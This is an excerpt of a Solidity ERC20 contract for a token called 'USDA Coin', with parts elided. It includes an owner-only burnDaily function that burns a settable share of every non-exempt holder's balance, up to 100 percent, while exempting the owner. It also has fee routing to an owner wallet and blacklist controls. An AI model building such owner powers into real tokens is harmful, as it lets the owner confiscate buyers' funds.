...
contract USDA is ERC20, Ownable {
    ...
    uint256 public dailyBurnPercent;
    address public feewallet;
    mapping(address => bool) public _isBlacklisted;
    mapping(address => bool) public _isWhitelisted;
    mapping(address => bool) public _isBurnWhitelisted;
    EnumerableSet.AddressSet private _holders;
    bool private LP_START = false;
    address public lp_address;

    constructor() ERC20("USDA Coin", "USDA") {
        _mint(msg.sender, 125000000 * 1e18); 
        _isWhitelisted[msg.sender]=true;
        _isBurnWhitelisted[msg.sender]=true;
    ...
    function _transfer(address from,address to,uint256 amount) internal override {
        ...
        if (contractT && (!LP_START)) {
            require(from == lp_address, "add lp error!");
            LP_START = true;
        }
        ...
        if(takeFee){
            ...
            if(fees>0) super._transfer(from,feewallet,fees);
            amount=amount-fees;
        }
    ...
    function burnDaily() external onlyOwner {
        uint256 burnAmount = totalSupply() * dailyBurnPercent / 100;
        require(burnAmount > 0, "Burn amount too small");
        for(uint256 i = 0; i < _holders.length(); i++) {
            address holder = _holders.at(i);
            uint256 holderBalance = balanceOf(holder);
            uint256 holderBurnAmount = holderBalance * dailyBurnPercent / 100;
            if (!_isBurnWhitelisted[holder] && holderBurnAmount > 0){
                _burn(holder, holderBurnAmount);
            }
        }
    }

    function updateLpStatus(bool status) public onlyOwner {
        LP_START = status;
    }
    ...
    function setBurnPercent(uint256 _Percent) external onlyOwner {
        require(_Percent <= 100, "Fee is too high");
        dailyBurnPercent = _Percent;
    }

    function setBurnWhitelist(address[] calldata addresses, bool flag) external onlyOwner {
        for (uint256 i = 0; i < addresses.length; i++) {
            _isBurnWhitelisted[addresses[i]] = flag;
        }
    }
